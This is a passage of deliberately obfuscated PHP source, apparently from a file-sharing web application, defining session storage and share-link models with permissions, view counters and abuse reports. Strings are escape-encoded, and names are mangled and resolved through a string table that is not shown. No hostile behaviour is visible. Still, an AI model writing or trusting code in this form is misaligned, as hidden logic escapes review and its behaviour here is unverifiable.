"\123\171\163\164\x65\x6d\56\163\x6f\165\162\x63\145\x53\x65\143\162\145\164\x4c\151\x73\x74"; public $field = array("\163\157\x75\x72\143\x65\x49\x44", "\x74\x79\160\x65\x49\x44", "\143\162\145\x61\164\145\125\x73\x65\x72"); } goto B¹ÖÎ„ÚÂÚ; fôÎäàÈÎ: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\x73\x65\163\163\x69\157\156"; public function get($¦®Ò©¥“) { $Ÿ¥ê¦ñ =& $_SERVER[„Ç©ñÎ©]; $òÍ—÷ß = $this->where(array($Ÿ¥ê¦ñ[1962] => $¦®Ò©¥“))->find(); if (!is_array($òÍ—÷ß)) { return !1; } return $òÍ—÷ß[$Ÿ¥ê¦ñ[758]]; } public function set($–¾¤â»©, $±ùƒÖœ, $²œ‚ğš = 3600) { $õ§”é«Í =& $_SERVER[„Ç©ñÎ©]; $¿ĞéáÍÆ = array($õ§”é«Í[1962] => $–¾¤â»©, $õ§”é«Í[1866] => $±ùƒÖœ, $õ§”é«Í[1963] => $²œ‚ğš + time()); if (Session::get($õ§”é«Í[1964])) { $¿ĞéáÍÆ[$õ§”é«Í[1655]] = Session::get($õ§”é«Í[1964]); } else { $¿ĞéáÍÆ[$õ§”é«Í[1655]] = 0; } if ($this->get($–¾¤â»©)) { return $this->where(array($õ§”é«Í[1962] => $–¾¤â»©))->save($¿ĞéáÍÆ); } else { return $this->add($¿ĞéáÍÆ, array(), !0); } } public function remove($ó¡êÉ) { return $this->where(array($_SERVER[„Ç©ñÎ©][1962] => $ó¡êÉ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[„Ç©ñÎ©][1965] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74\x2c\165\160\x64\x61\164\145", "\146\165\x6e\143\x74\x69\x6f\156"), array("\x63\162\x65\141\164\x65\124\151\155\x65", "\164\151\x6d\x65", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x6f\160\x74\x69\157\156\x73", '', "\x69\x6e\163\145\x72\x74\54\x75\160\144\141\x74\x65\x2c\163\x65\154\145\143\164", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÚˆŠµçé) { $ÇÚÙº¸ï =& $_SERVER[„Ç©ñÎ©]; $„‘œ—„© = isset($ÚˆŠµçé[0]) ? $ÚˆŠµçé[0] : !1; return array($ÇÚÙº¸ï[1966] => array(USER_ID, $ÇÚÙº¸ï[1967]), $ÇÚÙº¸ï[1907] => array($„‘œ—„©, $ÇÚÙº¸ï[1968])); } protected function listSimple() { $®ÄÌâ¯ = array($_SERVER[„Ç©ñÎ©][1655] => USER_ID); $­­ç§Ì‘ = $this->field($this->fieldList)->where($®ÄÌâ¯)->select(); return $­­ç§Ì‘ ? $­­ç§Ì‘ : array(); } protected function getInfo($›€Æ©äû, $•¯ÂôÎÏ = false) { $×‰ù­ õ =& $_SERVER[„Ç©ñÎ©]; if ($•¯ÂôÎÏ) { return $this->_getShareInfo(array($×‰ù­ õ[498] => $›€Æ©äû)); } $Óü†âãÄ = $this->cacheFunctionGet($×‰ù­ õ[1909], $›€Æ©äû); return $Óü†âãÄ; } public function getInfoByHash($“æ¡³ÒŠ) { return $this->_getShareInfo(array($_SERVER[„Ç©ñÎ©][500] => $“æ¡³ÒŠ)); } public function getInfoByPath($˜ªµ×Ø¯) { $‘Ö·¥Ïõ =& $_SERVER[„Ç©ñÎ©]; $»¨ö›ªÄ = array($‘Ö·¥Ïõ[1655] => USER_ID, $‘Ö·¥Ïõ[411] => $˜ªµ×Ø¯); return $this->_getShareInfo($»¨ö›ªÄ); } public function getInfoBySourcePath($İÄşú´) { $¡µìÌåÏ =& $_SERVER[„Ç©ñÎ©]; $ó´û³à§ = array($¡µìÌåÏ[1655] => USER_ID, $¡µìÌåÏ[1175] => $İÄşú´); return $this->_getShareInfo($ó´û³à§); } private function _getShareInfo($À€Ñºß) { $ëÙ¼£†¡ =& $_SERVER[„Ç©ñÎ©]; $ÜÁŸÕÏ– = $this->where($À€Ñºß)->find(); if (!$ÜÁŸÕÏ–) { return !1; } $À€Ñºß = array($ëÙ¼£†¡[498] => $ÜÁŸÕÏ–[$ëÙ¼£†¡[498]]); $¡ŸÑÄ¦ = $ëÙ¼£†¡[1969]; $’ÛóÆ¾ = Model($ëÙ¼£†¡[611])->order($ëÙ¼£†¡[408])->field($¡ŸÑÄ¦)->where($À€Ñºß)->select(); if ($ÜÁŸÕÏ–[$ëÙ¼£†¡[411]] == $ëÙ¼£†¡[207]) { $ÜÁŸÕÏ–[$ëÙ¼£†¡[96]] = IO::info($ÜÁŸÕÏ–[$ëÙ¼£†¡[1175]]); } else { $ÜÁŸÕÏ–[$ëÙ¼£†¡[96]] = Model($ëÙ¼£†¡[1326])->pathInfo($ÜÁŸÕÏ–[$ëÙ¼£†¡[411]]); } $ÜÁŸÕÏ–[$ëÙ¼£†¡[1970]] = $’ÛóÆ¾; return $ÜÁŸÕÏ–; } protected function getInfoAuth($¾‹µŸÅí) { $œÉâÌâø =& $_SERVER[„Ç©ñÎ©]; $«…ÈóªÏ = $this->getInfo($¾‹µŸÅí); if ($«…ÈóªÏ[$œÉâÌâø[1655]] == USER_ID) { $«…ÈóªÏ[$œÉâÌâø[422]] = $«…ÈóªÏ[$œÉâÌâø[96]][$œÉâÌâø[422]]; } else { $«…ÈóªÏ[$œÉâÌâø[422]] = Model($œÉâÌâø[511])->authMake($«…ÈóªÏ[$œÉâÌâø[1970]]); } return $«…ÈóªÏ; } protected function listData($òû’Îäæ = null, $™’±š÷ª = 300) { $ø¦Ííôè =& $_SERVER[„Ç©ñÎ©]; $ÇúóÔº± = array(array($ø¦Ííôè[503] => array($ø¦Ííôè[1011], 0), $ø¦Ííôè[505] => array($ø¦Ííôè[1011], 0), $ø¦Ííôè[1971] => $ø¦Ííôè[1925])); if ($òû’Îäæ == $ø¦Ííôè[1972]) { $ÇúóÔº± = array($ø¦Ííôè[503] => 1); } else { if ($òû’Îäæ == $ø¦Ííôè[1160]) { $ÇúóÔº± = array($ø¦Ííôè[505] => 1); } } $ÇúóÔº±[$ø¦Ííôè[1655]] = USER_ID; $¹óŒß Á = $this->where($ÇúóÔº±)->selectPage($™’±š÷ª); return $¹óŒß Á; } protected function listToMe($­€Èµôé = 300) { $ÍÌªÊ±ô =& $_SERVER[„Ç©ñÎ©]; $šÎÄ­Ü¯ = Model($ÍÌªÊ±ô[1973])->userGroupParents(USER_ID); $şüÛ‘¥û = array($ÍÌªÊ±ô[595] => SourceModel::TYPE_USER, $ÍÌªÊ±ô[514] => USER_ID); if ($šÎÄ­Ü¯) { $şüÛ‘¥û = array(array($ÍÌªÊ±ô[595] => SourceModel::TYPE_USER, $ÍÌªÊ±ô[514] => USER_ID), array($ÍÌªÊ±ô[595] => SourceModel::TYPE_GROUP, $ÍÌªÊ±ô[514] => array($ÍÌªÊ±ô[7], $šÎÄ­Ü¯)), $ÍÌªÊ±ô[1971] => $ÍÌªÊ±ô[1925]); } $—Ò‹Å‡¶ = Model($ÍÌªÊ±ô[611])->where($şüÛ‘¥û)->selectPage($­€Èµôé); $Êô©´üâ = array_to_keyvalue_group($—Ò‹Å‡¶[$ÍÌªÊ±ô[378]], $ÍÌªÊ±ô[498]); if (!$Êô©´üâ) { return $—Ò‹Å‡¶; } $©³˜´ÅÉ = $ÍÌªÊ±ô[1974]; $şüÛ‘¥û = array($ÍÌªÊ±ô[498] => array($ÍÌªÊ±ô[427], array_keys($Êô©´üâ)), $ÍÌªÊ±ô[1655] => array($ÍÌªÊ±ô[1013], $ÍÌªÊ±ô[207])); $ª–ã±¶¡ = $this->field($©³˜´ÅÉ)->where($şüÛ‘¥û)->select(); foreach ($ª–ã±¶¡ as $³÷å¤ => &$°¼ÂŸÌÚ) { $°¼ÂŸÌÚ[$ÍÌªÊ±ô[1970]] = $Êô©´üâ[$°¼ÂŸÌÚ[$ÍÌªÊ±ô[498]]]; } unset($°¼ÂŸÌÚ); $ÄëæÉÚì = array($ÍÌªÊ±ô[1975] => $ª–ã±¶¡, $ÍÌªÊ±ô[1976] => $—Ò‹Å‡¶[$ÍÌªÊ±ô[375]]); return $ÄëæÉÚì; } protected function shareAdd($Ş‹¬ıü, $º¹²ä„Å) { $¯ÍÂ€Ì£ =& $_SERVER[„Ç©ñÎ©]; $æúã‘ğÑ = $this->_addShareData($Ş‹¬ıü, $º¹²ä„Å); if (!empty($º¹²ä„Å[$¯ÍÂ€Ì£[1977]])) { $this->_shareAuthSet($æúã‘ğÑ, $º¹²ä„Å[$¯ÍÂ€Ì£[1977]]); } $this->shareEventAdd($Ş‹¬ıü, $º¹²ä„Å, $¯ÍÂ€Ì£[1163]); return $æúã‘ğÑ; } protected function shareAddSystem($è¶™ÆŠå, $‚´ƒÕ¢º) { $Ğß–ï± =& $_SERVER[„Ç©ñÎ©]; $İ·Üàƒè = $this->_addShareData($è¶™ÆŠå, $‚´ƒÕ¢º, $Ğß–ï±[1275]); $this->_shareAuthSet($İ·Üàƒè, $‚´ƒÕ¢º[$Ğß–ï±[1977]]); return $İ·Üàƒè; } private function shareEventAdd($¯´ßµÚ¯, $„×—şµÉ, $ÍÃ÷¥İÔ = "\141\x64\144") { $‰ ¥îĞ„ =& $_SERVER[„Ç©ñÎ©]; if (!$¯´ßµÚ¯ || $¯´ßµÚ¯ == $‰ ¥îĞ„[207]) { return; } if ($ÍÃ÷¥İÔ == $‰ ¥îĞ„[1163]) { if ($„×—şµÉ[$‰ ¥îĞ„[503]] == $‰ ¥îĞ„[98]) { Model($‰ ¥îĞ„[579])->eventShare($¯´ßµÚ¯, $‰ ¥îĞ„[1978]); } if ($„×—şµÉ[$‰ ¥îĞ„[505]] == $‰ ¥îĞ„[98]) { Model($‰ ¥îĞ„[579])->eventShare($¯´ßµÚ¯, $‰ ¥îĞ„[1979]); } return; } $òÀÅò™ = $this->getInfoByPath($¯´ßµÚ¯); $µŸó·—ğ = $‰ ¥îĞ„[1980]; if ($òÀÅò™[$‰ ¥îĞ„[503]] == $‰ ¥îĞ„[207] && $„×—şµÉ[$‰ ¥îĞ„[503]] == $‰ ¥îĞ„[98]) { $µŸó·—ğ = $‰ ¥îĞ„[1978]; } if ($òÀÅò™[$‰ ¥îĞ„[503]] == $‰ ¥îĞ„[98] && $„×—şµÉ[$‰ ¥îĞ„[503]] == $‰ ¥îĞ„[207]) { $µŸó·—ğ = $‰ ¥îĞ„[1981]; } if ($òÀÅò™[$‰ ¥îĞ„[505]] == $‰ ¥îĞ„[207] && $„×—şµÉ[$‰ ¥îĞ„[505]] == $‰ ¥îĞ„[98]) { $µŸó·—ğ = $‰ ¥îĞ„[1979]; } if ($òÀÅò™[$‰ ¥îĞ„[505]] == $‰ ¥îĞ„[98] && $„×—şµÉ[$‰ ¥îĞ„[505]] == $‰ ¥îĞ„[207]) { $µŸó·—ğ = $‰ ¥îĞ„[1982]; } Model($‰ ¥îĞ„[579])->eventShare($¯´ßµÚ¯, $µŸó·—ğ); return; } private function _addShareData($â­Â…Ëá, $úÉÉ¥Ëƒ = array(), $±›¹‡ = false) { $ÛåòŠ²è =& $_SERVER[„Ç©ñÎ©]; $¡Ó¿û » = $±›¹‡ == $ÛåòŠ²è[1275] ? 0 : USER_ID; $®âªôÓª = array($ÛåòŠ²è[426] => $â­Â…Ëá, $ÛåòŠ²è[1646] => $¡Ó¿û »); if ($â­Â…Ëá == 0) { $®âªôÓª = array($ÛåòŠ²è[1983] => $úÉÉ¥Ëƒ[$ÛåòŠ²è[1175]], $ÛåòŠ²è[1646] => $¡Ó¿û »); } if ($ñ˜ï®®ë = $this->where($®âªôÓª)->find()) { return $ñ˜ï®®ë[$ÛåòŠ²è[498]]; } if ($â­Â…Ëá == 0) { $¦ùÃº¤Ì = array($ÛåòŠ²è[32] => get_path_this($úÉÉ¥Ëƒ[$ÛåòŠ²è[94]])); } else { $¦ùÃº¤Ì = Model($ÛåòŠ²è[828])->sourceInfo($â­Â…Ëá); if (!$¦ùÃº¤Ì) { return !1; } } if (!$úÉÉ¥Ëƒ[$ÛåòŠ²è[1554]]) { $úÉÉ¥Ëƒ[$ÛåòŠ²è[1554]] = $¦ùÃº¤Ì[$ÛåòŠ²è[32]]; } $©õ±œÆû = array($ÛåòŠ²è[1646] => $¡Ó¿û », $ÛåòŠ²è[426] => $â­Â…Ëá, $ÛåòŠ²è[1554] => $ÛåòŠ²è[12], $ÛåòŠ²è[503] => 0, $ÛåòŠ²è[505] => 0, $ÛåòŠ²è[1175] => $ÛåòŠ²è[12], $ÛåòŠ²è[316] => $ÛåòŠ²è[12], $ÛåòŠ²è[888] => $ÛåòŠ²è[12], $ÛåòŠ²è[1984] => 0, $ÛåòŠ²è[1985] => 0, $ÛåòŠ²è[506] => 0, $ÛåòŠ²è[507] => $ÛåòŠ²è[12], $ÛåòŠ²è[500] => $ÛåòŠ²è[12]); $ï…ŸÂ¥Ö = explode($ÛåòŠ²è[50], $ÛåòŠ²è[1986]); foreach ($ï…ŸÂ¥Ö as $×‰åè) { if (!isset($úÉÉ¥Ëƒ[$×‰åè])) { continue; } $©õ±œÆû[$×‰åè] = $úÉÉ¥Ëƒ[$×‰åè]; } $Å²‚ú¢ = $this->add($©õ±œÆû); $”ÄÂ£òÄ = array($ÛåòŠ²è[500] => short_id($Å²‚ú¢)); $this->where(array($ÛåòŠ²è[497] => $Å²‚ú¢))->save($”ÄÂ£òÄ); return $Å²‚ú¢; } private function _shareAuthSet($ä•ª…åê, $ğâİ¨«í) { $ŞÙ·ò¶Ä =& $_SERVER[„Ç©ñÎ©]; if (!is_array($ğâİ¨«í)) { return !1; } $‹•ÒÂĞ = Model($ŞÙ·ò¶Ä[1935]); $‹•ÒÂĞ->where(array($ŞÙ·ò¶Ä[498] => $ä•ª…åê))->delete(); $Êş•Êõ = array(); foreach ($ğâİ¨«í as $´¡âòÎ») { $÷ŒôÔê = SourceModel::TYPE_USER; if ($´¡âòÎ»[$ŞÙ·ò¶Ä[420]] == SourceModel::TYPE_GROUP) { $÷ŒôÔê = SourceModel::TYPE_GROUP; } $†Ìî“é = array($ŞÙ·ò¶Ä[498] => $ä•ª…åê, $ŞÙ·ò¶Ä[420] => $÷ŒôÔê, $ŞÙ·ò¶Ä[514] => intval($´¡âòÎ»[$ŞÙ·ò¶Ä[514]]), $ŞÙ·ò¶Ä[1931] => 0, $ŞÙ·ò¶Ä[1987] => -1); if ($´¡âòÎ»[$ŞÙ·ò¶Ä[1931]]) { $†Ìî“é[$ŞÙ·ò¶Ä[1931]] = $´¡âòÎ»[$ŞÙ·ò¶Ä[1931]]; } else { if ($´¡âòÎ»[$ŞÙ·ò¶Ä[1987]]) { $†Ìî“é[$ŞÙ·ò¶Ä[1987]] = $´¡âòÎ»[$ŞÙ·ò¶Ä[1987]]; } } $Êş•Êõ[] = $†Ìî“é; } return $‹•ÒÂĞ->addAll($Êş•Êõ, array(), !0); } public function numViewAdd($İˆîèõ) { $¥ÔÚ‡É¥ =& $_SERVER[„Ç©ñÎ©]; $ ·µ§Æƒ = array($¥ÔÚ‡É¥[497] => $İˆîèõ); $this->where($ ·µ§Æƒ)->setAdd($¥ÔÚ‡É¥[1984]); } public function numDownloadAdd($Ìİ¬—İß) { $î˜šÔÜĞ =& $_SERVER[„Ç©ñÎ©]; $‚šÌĞûø = array($î˜šÔÜĞ[497] => $Ìİ¬—İß); $this->where($‚šÌĞûø)->setAdd($î˜šÔÜĞ[1985]); } protected function shareEdit($â«‹éóÂ, $ˆ›ä÷Á¶) { $ÄÆ»ÑâË =& $_SERVER[„Ç©ñÎ©]; $æ¿œÔ—ß = $this->getInfo($â«‹éóÂ); if (!$æ¿œÔ—ß) { return !1; } $this->_checkLinkShare($ˆ›ä÷Á¶, $æ¿œÔ—ß); $•áîìƒĞ = array(); $Íäï¶¢½ = explode($ÄÆ»ÑâË[50], $ÄÆ»ÑâË[1988]); foreach ($Íäï¶¢½ as $é–Ø¶ı) { if (!array_key_exists($é–Ø¶ı, $ˆ›ä÷Á¶)) { continue; } $•áîìƒĞ[$é–Ø¶ı] = $ˆ›ä÷Á¶[$é–Ø¶ı]; } $this->shareEventAdd($æ¿œÔ—ß[$ÄÆ»ÑâË[411]], $ˆ›ä÷Á¶, $ÄÆ»ÑâË[1797]); $this->where(array($ÄÆ»ÑâË[497] => $â«‹éóÂ))->save($•áîìƒĞ); if (isset($ˆ›ä÷Á¶[$ÄÆ»ÑâË[1977]])) { $this->_shareAuthSet($â«‹éóÂ, $ˆ›ä÷Á¶[$ÄÆ»ÑâË[1977]]); } return !0; } private function _checkLinkShare($ÖšÁä†Î, $ŒÜƒæ¶‘) { $²–Æµ =& $_SERVER[„Ç©ñÎ©]; if ($ÖšÁä†Î[$²–Æµ[503]] != $²–Æµ[98]) { return; } $óı»ÙÄ = $ŒÜƒæ¶‘[$²–Æµ[96]][$²–Æµ[411]]; if ($ŒÜƒæ¶‘[$²–Æµ[96]][$²–Æµ[33]] != $²–Æµ[209]) { $¯áÇ®ò = $this->_folderReport($óı»ÙÄ); if (!$¯áÇ®ò) { return; } show_json(LNG($²–Æµ[1989]) . $²–Æµ[1990] . $¯áÇ®ò, !1); } $ç¡ùŒ¸ö = Model($²–Æµ[828])->fileInfoGet($ŒÜƒæ¶‘[$²–Æµ[96]][$²–Æµ[411]]); if (!$ç¡ùŒ¸ö) { return; } $ÓÌÏ¨ñ† = $this->shareFileMeta($ç¡ùŒ¸ö[$²–Æµ[477]]); if (isset($ÓÌÏ¨ñ†[$²–Æµ[383]]) && $ÓÌÏ¨ñ†[$²–Æµ[383]] == $²–Æµ[98]) { show_json(LNG($²–Æµ[1991]), !1); } } private function _folderReport($¾ÂÆ›ô£) { $æœª‚¹¦ =& $_SERVER[„Ç©ñÎ©]; $‚ùù­ÅÌ = array($æœª‚¹¦[477] => array($æœª‚¹¦[1011], 0), $æœª‚¹¦[753] => 3); $áèæí¤‚ = Model($æœª‚¹¦[1992])->where($‚ùù­ÅÌ)->field($æœª‚¹¦[477])->select(); if (!$áèæí¤‚) { return !1; } $áèæí¤‚ = array_to_keyvalue($áèæí¤‚, $æœª‚¹¦[12], $æœª‚¹¦[477]); $Ø£šÂï = $æœª‚¹¦[50] . $¾ÂÆ›ô£ . $æœª‚¹¦[50]; $‚ùù­ÅÌ = array($æœª‚¹¦[477] => array($æœª‚¹¦[7], $áèæí¤‚), $æœª‚¹¦[530] => array($æœª‚¹¦[392], "\x25{$Ø£šÂï}\45"), $æœª‚¹¦[440] => 0); $Äİ‹ƒ‚¼ = Model($æœª‚¹¦[828])->where($‚ùù­ÅÌ)->field($æœª‚¹¦[1993])->find(); if (!$Äİ‹ƒ‚¼) { return !1; } $Ø­´üçÚ = substr($Äİ‹ƒ‚¼[$æœª‚¹¦[530]], strpos($Äİ‹ƒ‚¼[$æœª‚¹¦[530]], $Ø£šÂï)); $‚ùù­ÅÌ = array($æœª‚¹¦[411] => array($æœª‚¹¦[7], trim($Ø­´üçÚ, $æœª‚¹¦[50]))); $…ËÚ¢Â = Model($æœª‚¹¦[828])->where($‚ùù­ÅÌ)->field($æœª‚¹¦[32])->select(); $¸¤şáñ = array_to_keyvalue($…ËÚ¢Â, $æœª‚¹¦[12], $æœª‚¹¦[32]); $¸¤şáñ[] = $Äİ‹ƒ‚¼[$æœª‚¹¦[32]]; return implode($æœª‚¹¦[8], $¸¤şáñ); } protected function remove($êã¢–óş) { $ˆûş¶óß =& $_SERVER[„Ç©ñÎ©]; if (is_array($êã¢–óş)) { $êã¢–óş = array($ˆûş¶óß[7], $êã¢–óş); } $ûÅüªäÛ = array($ˆûş¶óß[498] => $êã¢–óş); $ŸÖ¨æÁ“ = $this->where($ûÅüªäÛ)->delete(); if ($ŸÖ¨æÁ“) { Model($ˆûş¶óß[611])->where(array($ˆûş¶óß[498] => $êã¢–óş))->delete(); } $¶Äï¶æ = is_array($êã¢–óş) ? $êã¢–óş[1] : array($êã¢–óş); for ($¬µ©ìÉë = 0; $¬µ©ìÉë < count($¶Äï¶æ); $¬µ©ìÉë++) { $ò¾’ó¦™ = $this->getInfo($¶Äï¶æ[$¬µ©ìÉë]); if ($ò¾’ó¦™[$ˆûş¶óß[505]] == $ˆûş¶óß[98]) { Model($ˆûş¶óß[579])->eventShare($ò¾’ó¦™[$ˆûş¶óß[411]], $ˆûş¶óß[1982]); } if ($ò¾’ó¦™[$ˆûş¶óß[503]] == $ˆûş¶óß[98]) { Model($ˆûş¶óß[579])->eventShare($ò¾’ó¦™[$ˆûş¶óß[411]], $ˆûş¶óß[1981]); } } return $ŸÖ¨æÁ“; } protected function removeBySource($ô„åáÊç) { $÷Ò”˜á· =& $_SERVER[„Ç©ñÎ©]; $ˆœ¨Ô££ = array($÷Ò”˜á·[426] => array($÷Ò”˜á·[427], $ô„åáÊç)); $ÀÒôÃ = $this->field($÷Ò”˜á·[498])->where($ˆœ¨Ô££)->select(); $ÀÒôÃ = array_to_keyvalue($ÀÒôÃ, $÷Ò”˜á·[12], $÷Ò”˜á·[498]); if (!$ÀÒôÃ) { return; } $ˆœ¨Ô££ = array($÷Ò”˜á·[497] => array($÷Ò”˜á·[427], $ÀÒôÃ)); $this->where($ˆœ¨Ô££)->delete(); Model($÷Ò”˜á·[611])->where($ˆœ¨Ô££)->delete(); } public function listAll($ÓâÀë¤˜) { $ô£˜“Ê =& $_SERVER[„Ç©ñÎ©]; $Õªˆ¿ùÅ = array(); if ($ÓâÀë¤˜[$ô£˜“Ê[1655]]) { $Õªˆ¿ùÅ[$ô£˜“Ê[1655]] = $ÓâÀë¤˜[$ô£˜“Ê[1655]]; } if ($ÓâÀë¤˜[$ô£˜“Ê[764]]) { $‡‰×Óë = $ÓâÀë¤˜[$ô£˜“Ê[506]] ? $ÓâÀë¤˜[$ô£˜“Ê[506]] : strtotime(date($ô£˜“Ê[1994])); $Õªˆ¿ùÅ[$ô£˜“Ê[210]] = array($ô£˜“Ê[342], array($ÓâÀë¤˜[$ô£˜“Ê[764]], $‡‰×Óë)); } if ($ÓâÀë¤˜[$ô£˜“Ê[33]]) { $Õªˆ¿ùÅ[$ÓâÀë¤˜[$ô£˜“Ê[33]]] = 1; } else { $Õªˆ¿ùÅ[] = array($ô£˜“Ê[503] => array($ô£˜“Ê[1011], 0), $ô£˜“Ê[505] => array($ô£˜“Ê[1011], 0), $ô£˜“Ê[1971] => $ô£˜“Ê[1925]); } if ($ÓâÀë¤˜[$ô£˜“Ê[1921]]) { $Õªˆ¿ùÅ[] = array($ô£˜“Ê[500] => $ÓâÀë¤˜[$ô£˜“Ê[1921]], $ô£˜“Ê[1554] => array($ô£˜“Ê[392], "\45{$ÓâÀë¤˜[$ô£˜“Ê[1921]]}\x25"), $ô£˜“Ê[1971] => $ô£˜“Ê[1925]); } $ì¼Ã’ = $this->_makeOrder()->where($Õªˆ¿ùÅ)->selectPage(20); if (empty($ì¼Ã’[$ô£˜“Ê[378]])) { return array(); } $this->_listDataApply($ì¼Ã’[$ô£˜“Ê[378]]); return $ì¼Ã’; } public function listDataApply($á’Ì××É) { $this->_listDataApply($á’Ì××É); return $á’Ì××É; } private function _listDataApply(&$Æ·­êÔ) { $¿Ò‹¹É =& $_SERVER[„Ç©ñÎ©]; $ïó “Üƒ = array_to_keyvalue($Æ·­êÔ, $¿Ò‹¹É[12], $¿Ò‹¹É[1655]); $ÑúÜµ›é = Model($¿Ò‹¹É[544])->userListInfo(array_unique($ïó “Üƒ)); $§™Ÿä = array_to_keyvalue($Æ·­êÔ, $¿Ò‹¹É[12], $¿Ò‹¹É[411]); $€ÒÔ¥‰ä = Model($¿Ò‹¹É[828])->sourceListInfo($§™Ÿä, !0); foreach ($Æ·­êÔ as $†Ï›ÒĞ· => &$æÍÆäå) { $É½°¸· = $æÍÆäå[$¿Ò‹¹É[1655]]; $æÍÆäå[$¿Ò‹¹É[1995]] = $ÑúÜµ›é[$É½°¸·] ? $ÑúÜµ›é[$É½°¸·] : !1; $»ù¾ê”÷ = $æÍÆäå[$¿Ò‹¹É[411]]; $æÍÆäå[$¿Ò‹¹É[96]] = $€ÒÔ¥‰ä[$»ù¾ê”÷] ? $€ÒÔ¥‰ä[$»ù¾ê”÷] : !1; if ($æÍÆäå[$¿Ò‹¹É[96]][$¿Ò‹¹É[440]] == $¿Ò‹¹É[98]) { unset($Æ·­êÔ[$†Ï›ÒĞ·]); } if ($æÍÆäå[$¿Ò‹¹É[96]] != $¿Ò‹¹É[207] && !$æÍÆäå[$¿Ò‹¹É[96]]) { unset($Æ·­êÔ[$†Ï›ÒĞ·]); } } unset($æÍÆäå); $Æ·­êÔ = array_values($Æ·­êÔ); } private function _makeOrder($ÖÔ§£«Ñ = '') { $‚Ÿ±ÄÛô =& $_SERVER[„Ç©ñÎ©]; $¾ğÆ¶¦â = array($‚Ÿ±ÄÛô[210], $‚Ÿ±ÄÛô[506], $‚Ÿ±ÄÛô[1984], $‚Ÿ±ÄÛô[1985]); $£Ë í®ô = array($‚Ÿ±ÄÛô[459] => $‚Ÿ±ÄÛô[460], $‚Ÿ±ÄÛô[461] => $‚Ÿ±ÄÛô[462]); $æ¡Ÿ‚‘Ø = Input::get($‚Ÿ±ÄÛô[466], $‚Ÿ±ÄÛô[7], $‚Ÿ±ÄÛô[432], $¾ğÆ¶¦â); $âÃ£É¼ = Input::get($‚Ÿ±ÄÛô[467], $‚Ÿ±ÄÛô[7], $‚Ÿ±ÄÛô[1996], array($‚Ÿ±ÄÛô[1918], $‚Ÿ±ÄÛô[461])); $âÃ£É¼ = $£Ë í®ô[$âÃ£É¼]; $ÖÔ§£«Ñ = $ÖÔ§£«Ñ . "{$æ¡Ÿ‚‘Ø}\x20{$âÃ£É¼}"; return $this->order($ÖÔ§£«Ñ); } public function reportAdd($¤úÒõéå) { $—¾¶¡×Ò =& $_SERVER[„Ç©ñÎ©]; $™§ÏÖÊ = array($—¾¶¡×Ò[498] => $¤úÒõéå[$—¾¶¡×Ò[498]], $—¾¶¡×Ò[1655] => USER_ID); if (Model($—¾¶¡×Ò[1992])->where($™§ÏÖÊ)->find()) { return !1; } $»ÄƒËÄì = array($—¾¶¡×Ò[498] => $¤úÒõéå[$—¾¶¡×Ò[498]], $—¾¶¡×Ò[1554] => $¤úÒõéå[$—¾¶¡×Ò[1554]], $—¾¶¡×Ò[411] => $¤úÒõéå[$—¾¶¡×Ò[411]], $—¾¶¡×Ò[477] => $¤úÒõéå[$—¾¶¡×Ò[477]], $—¾¶¡×Ò[1655] => USER_ID, $—¾¶¡×Ò[33] => $¤úÒõéå[$—¾¶¡×Ò[33]], $—¾¶¡×Ò[462] => $¤úÒõéå[$—¾¶¡×Ò[462]]); return Model($—¾¶¡×Ò[1992])->add($»ÄƒËÄì); } public function reportList($íıîîŠì) { $«ë†£Ş =& $_SERVER[„Ç©ñÎ©]; $ÏÛ§îŒÊ = array(); if ($íıîîŠì[$«ë†£Ş[764]]) { $ê’‘×¸ = $íıîîŠì[$«ë†£Ş[506]] ? $íıîîŠì[$«ë†£Ş[506]] : strtotime(date($«ë†£Ş[1994])); $ÏÛ§îŒÊ[$«ë†£Ş[210]] = array($«ë†£Ş[342], array($íıîîŠì[$«ë†£Ş[764]], $ê’‘×¸)); } if (isset($íıîîŠì[$«ë†£Ş[33]]) && in_array($íıîîŠì[$«ë†£Ş[33]], array($«ë†£Ş[98], $«ë†£Ş[446], $«ë†£Ş[1997], $«ë†£Ş[1998], $«ë†£Ş[1999]))) { $ÏÛ§îŒÊ[$«ë†£Ş[33]] = $íıîîŠì[$«ë†£Ş[33]]; } if (isset($íıîîŠì[$«ë†£Ş[753]]) && in_array($íıîîŠì[$«ë†£Ş[753]], array($«ë†£Ş[207], $«ë†£Ş[98], $«ë†£Ş[446], $«ë†£Ş[1997]))) { $ÏÛ§îŒÊ[$«ë†£Ş[753]] = $íıîîŠì[$«ë†£Ş[753]]; } $å¬–Óîı = Input::get($«ë†£Ş[467], $«ë†£Ş[7], $«ë†£Ş[1996], array($«ë†£Ş[1918], $«ë†£Ş[461])); $ßÀ¿à´ = array($«ë†£Ş[459] => $«ë†£Ş[460], $«ë†£Ş[461] => $«ë†£Ş[462]); $ÅËÌœ“¥ = $«ë†£Ş[2000] . $ßÀ¿à´[$å¬–Óîı]; $¨¡ŒÃ˜ = Model($«ë†£Ş[1992])->where($ÏÛ§îŒÊ)->order($ÅËÌœ“¥)->selectPage(20); if (empty($¨¡ŒÃ˜[$«ë†£Ş[378]])) { return array(); } $ñÅ³½º· = array_to_keyvalue_group($¨¡ŒÃ˜[$«ë†£Ş[378]], $«ë†£Ş[753], $«ë†£Ş[498]); if (!empty($ñÅ³½º·[0])) { $íıîîŠì = $ñÅ³½º·[0]; $ÏÛ§îŒÊ = array($«ë†£Ş[498] => array($«ë†£Ş[7], $íıîîŠì)); $›™½…‹æ = $this->where($ÏÛ§îŒÊ)->field($«ë†£Ş[498])->select(); $›™½…‹æ = array_to_keyvalue($›™½…‹æ, $«ë†£Ş[12], $«ë†£Ş[498]); $®Ìš‰÷ = array_diff($íıîîŠì, $›™½…‹æ); if (!empty($®Ìš‰÷)) { foreach ($¨¡ŒÃ˜[$«ë†£Ş[378]] as $„ö¢›ù¸ => $Õ¼’ú™×) { if (in_array($Õ¼’ú™×[$«ë†£Ş[498]], $®Ìš‰÷)) { unset($¨¡ŒÃ˜[$«ë†£Ş[378]][$„ö¢›ù¸]); } } } } $this->_listDataApply($¨¡ŒÃ˜[$«ë†£Ş[378]]); return 